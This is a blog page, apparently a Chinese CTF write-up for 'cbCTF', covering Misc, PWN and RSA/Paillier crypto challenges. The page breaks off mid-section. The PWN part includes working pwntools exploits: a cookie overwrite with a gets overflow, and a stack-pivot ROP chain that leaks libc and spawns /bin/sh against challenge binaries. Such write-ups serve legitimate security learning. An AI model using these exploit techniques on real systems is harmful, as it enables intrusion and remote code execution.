@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zn-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="cbCTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cbctf">
+<meta property="og:url" content="https://caiii-vegtable.github.io/2020/07/29/cbctf/index.html">
+<meta property="og:site_name" content="inHaus&#39;blog">
+<meta property="og:description" content="cbCTF">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/misc2.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/func1.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/func2.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/system.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/sec.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/out.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/main.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/func.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/bss.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/check.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/leave.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/pop.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/checkin.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/encode.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/decode.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/pail.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/web.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/cbctf/flag.png">
+<meta property="article:published_time" content="2020-07-29T00:02:46.000Z">
+<meta property="article:modified_time" content="2020-07-29T01:10:09.641Z">
+<meta property="article:author" content="caiii-vegtable">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/cbctf/misc2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/07/29/cbctf/"/>
+
+
+
+
+
+  <title>cbctf | inHaus'blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zn-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">inHaus'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/07/29/cbctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="caiii-vegtable">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inHaus'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">cbctf</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-29T08:02:46+08:00">
+                2020-07-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="cbCTF"><a href="#cbCTF" class="headerlink" title="cbCTF"></a>cbCTF</h1><a id="more"></a>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>ascii码</p>
+<h3 id="α层"><a href="#α层" class="headerlink" title="α层"></a>α层</h3><p>两张图片，一张上是flag，一张上有个白框。</p>
+<p>题目是α层，用ps更改白框的阿尔法值，框出flag。</p>
+<p><img src="/image/cbctf/misc2.png" alt="misc2"></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><p>main函数里两个函数func1和func2</p>
+<p><img src="/image/cbctf/func1.png" alt="func1"></p>
+<p>读入0x70个字符，不会溢出。</p>
+<p><img src="/image/cbctf/func2.png" alt="func2"></p>
+<p>读入8字节，比较cooki和135792468，相同才继续。</p>
+<p>存在后面函数</p>
+<p><img src="/image/cbctf/system.png" alt="system"></p>
+<p>main函数中还有个gets函数可以溢出。</p>
+<p>查看保护</p>
+<p><img src="/image/cbctf/sec.png" alt="sec"></p>
+<p>开了nx。</p>
+<p>思路：堆栈地址没有随机，考虑覆盖cooki为135792468。再利用gets溢出调用后面函数。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./backdoor_for_jianjian')</span></span><br><span class="line">p = remote(<span class="string">'121.41.13.20'</span>,<span class="number">32773</span>)</span><br><span class="line"></span><br><span class="line">cookie = <span class="number">135792468</span></span><br><span class="line">payload1 = <span class="number">0x6c</span>*<span class="string">'a'</span>+p32(cookie)</span><br><span class="line">p.recvuntil(<span class="string">'Are you jianjian?(y/n)'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">system_addr = <span class="number">0x4007c3</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/cbctf/out.png" alt="out"></p>
+<h3 id="suggestion-box"><a href="#suggestion-box" class="headerlink" title="suggestion box"></a>suggestion box</h3><p>虽然没有做出了但是还是写一下思路。</p>
+<p>main函数</p>
+<p><img src="/image/cbctf/main.png" alt="main"></p>
+<p>func函数</p>
+<p><img src="/image/cbctf/func.png" alt="func"></p>
+<p>就是两个读入。</p>
+<p>func写到.bss段上</p>
+<p><img src="/image/cbctf/bss.png" alt="bss"></p>
+<p>main函数中的read写道栈上，存在栈溢出，但是只够覆盖rip。</p>
+<p>查看保护</p>
+<p><img src="/image/cbctf/check.png" alt="check"></p>
+<p>打开NX，堆栈不可执行，不能写shellcode。考虑栈迁移。</p>
+<p>思路：第一次栈迁移，泄露puts地址，返回到main函数，再次栈迁移，调用system。</p>
+<p>栈迁移需要用到leave；ret指令</p>
+<p><img src="/image/cbctf/leave.png" alt="leave"></p>
+<p>64位调用需要pop；rdi；ret</p>
+<p><img src="/image/cbctf/pop.png" alt="pop"></p>
+<p>leave；ret == mov rsp rbp；pop rbp；ret</p>
+<p>迁移时会pop一次，所以迁移地址先减8</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">'./suggestion_box'</span>)</span><br><span class="line"><span class="comment">#p = remote('121.41.13.20',32775)</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./suggestion_box'</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x000000000040069c</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400783</span></span><br><span class="line">bss_addr= <span class="number">0x0000000000602040</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x40069e</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x10</span> + p64(bss_addr<span class="number">-0x8</span>) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload2=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload3 = p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> vanish <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Getprime</span><span class="params">(g)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p=g*random.randint(<span class="number">1</span>,g)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isprime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">g=getprime(<span class="number">512</span>)</span><br><span class="line">p=Getprime(g)</span><br><span class="line">q=Getprime(g)</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcm</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (a*b)/gcd(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'lcm(p-1,q-1): %d'</span>%(lcm(p<span class="number">-1</span>,q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n: %d'</span>%(p*q)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c: %d'</span>%(pow(m,e,p*q))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">lcm(p-1,q-1): 29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540</span></span><br><span class="line"><span class="string">n: 2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607</span></span><br><span class="line"><span class="string">c: 2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>RSA，已知了（q-1）*（p-1），n和c</p>
+<p>求d，再解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phin=<span class="number">29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540</span></span><br><span class="line">c=<span class="number">2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638</span></span><br><span class="line">n=<span class="number">2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phin)</span><br><span class="line"></span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="/image/cbctf/checkin.png" alt="checkin"></p>
+<h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> vanish <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getprime(<span class="number">512</span>)</span><br><span class="line">q=nextprime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line">g=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"g=%d"</span>%(g)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275</span></span><br><span class="line"><span class="string">n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083</span></span><br><span class="line"><span class="string">g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108</span></span><br><span class="line"><span class="string">p=10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123</span></span><br><span class="line"><span class="string">q=521</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>根据提示查到是Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。</p>
+<p><a href="http://blog.b3ale.cn/2019/10/24/Python实现Paillier加密解密算法/" target="_blank" rel="noopener">http://blog.b3ale.cn/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</a>参考</p>
+<p><img src="/image/cbctf/encode.png" alt="encode">)<img src="/image/cbctf/decode.png" alt="decode"></p>
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n=<span class="number">5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083</span></span><br><span class="line">c=<span class="number">14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275</span></span><br><span class="line">g=<span class="number">786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108</span></span><br><span class="line">q=<span class="number">10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123</span></span><br><span class="line">p=<span class="number">521</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x,n)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> (x<span class="number">-1</span>)/n</span><br><span class="line"></span><br><span class="line">lmd = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">u=gmpy2.invert(L(gmpy2.powmod(g,lmd,n**<span class="number">2</span>),n),n)%n</span><br><span class="line">m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line"></span><br><span class="line">plaintext = libnum.n2s(m)</span><br><span class="line"><span class="keyword">print</span> plaintext</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/cbctf/pail.png" alt="pail"></p>
+<h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><p>没做出来。写一下中间思路。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> e3,hint,flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1=<span class="number">2</span></span><br><span class="line">p1=<span class="number">1407082287125181464014767936705655200254016298201118080211963</span></span><br><span class="line">q1=<span class="number">4483497795612950594917254979514794222210515250120330465584919</span></span><br><span class="line">hint=int(hint.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">c1=pow(hint,e1,p1*q1)</span><br><span class="line"></span><br><span class="line">e2=<span class="number">5</span></span><br><span class="line">q2=<span class="number">898033</span></span><br><span class="line">p2=<span class="number">1027487</span></span><br><span class="line"><span class="keyword">assert</span> e3&lt;=<span class="number">300</span></span><br><span class="line">c2=pow(e3,e2,p2*q2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q3=<span class="number">16471885912035642894544190467774867069446937372970845578732298073</span></span><br><span class="line">p3=<span class="number">21122913513992623721920275602985463699928507831138027</span></span><br><span class="line"><span class="comment">#flag='flag&#123;*************&#125;'</span></span><br><span class="line">flag=int(flag.encode(<span class="string">'hex'</span>),<span class="number">16</span>) </span><br><span class="line">c3=pow(flag,e3,p3*q3)</span><br><span class="line">e3 = <span class="number">239</span></span><br><span class="line"><span class="keyword">print</span> c1 <span class="comment">#1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c2 <span class="comment">#779811265199</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c3 <span class="comment">#346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760</span></span><br></pre></td></tr></table></figure>
+
+<p>e1和e2都比较小，可以通过枚举，e3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line">e2=<span class="number">5</span></span><br><span class="line">q2=<span class="number">898033</span></span><br><span class="line">p2=<span class="number">1027487</span></span><br><span class="line">c2=<span class="number">779811265199</span></span><br><span class="line">n2=q2*p2</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">if</span>(gmpy.root(c2+i*n2,<span class="number">5</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">		e3 = gmpy.root(c2+i*n2,<span class="number">5</span>)</span><br><span class="line">		<span class="keyword">print</span> gmpy.root(c2+i*n2,<span class="number">5</span>)</span><br><span class="line">		<span class="keyword">print</span> e3</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">e3 = <span class="number">239</span></span><br></pre></td></tr></table></figure>
+
